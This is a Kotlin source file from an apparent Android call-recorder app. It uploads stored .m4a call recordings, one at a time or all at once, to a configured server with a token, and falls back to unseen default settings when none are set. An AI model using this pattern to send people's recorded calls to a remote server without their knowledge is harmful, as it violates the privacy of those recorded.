package com.example.recorder

import android.content.Context
import android.util.Log
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

object S3UploadManager {
    private const val TAG = "S3Upload"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    fun uploadFile(context: Context, filePath: String): Boolean {
        val file = File(filePath)
        if (!file.exists()) {
            Log.e(TAG, "File not found: $filePath")
            return false
        }

        val s3Url = S3ConfigManager.getS3Url(context)
        val authToken = S3ConfigManager.getAuthToken(context)

        if (!S3ConfigManager.isConfigured(context)) {
            Log.w(TAG, "S3 not configured, using defaults")
            S3ConfigManager.setDefaultConfig(context)
        }

        return try {
            val fileName = file.name

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("name_of_image", fileName)
                .addFormDataPart(
                    "image",
                    fileName,
                    file.asRequestBody("audio/m4a".toMediaTypeOrNull())
                )
                .build()

            val request = Request.Builder()
                .url(s3Url)
                .addHeader("Authorization", "Token $authToken")
                .post(requestBody)
                .build()

            Log.d(TAG, "📤 Uploading: $fileName to $s3Url")

            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d(TAG, "✅ Upload successful: $fileName")
                    true
                } else {
                    Log.e(TAG, "❌ Upload failed: ${response.code} - ${response.message}")
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Upload error", e)
            false
        }
    }

    fun uploadAllRecordings(context: Context): Int {
        val recordingsDir = File(context.filesDir, "CallRecordings")
        if (!recordingsDir.exists()) {
            Log.w(TAG, "Recordings directory not found")
            return 0
        }

        val files = recordingsDir.listFiles { file ->
            file.extension == "m4a"
        } ?: return 0

        var successCount = 0
        for (file in files) {
            if (uploadFile(context, file.absolutePath)) {
                successCount++
            }
            Thread.sleep(500)
        }

        Log.d(TAG, "Uploaded $successCount/${files.size} files")
        return successCount
    }
}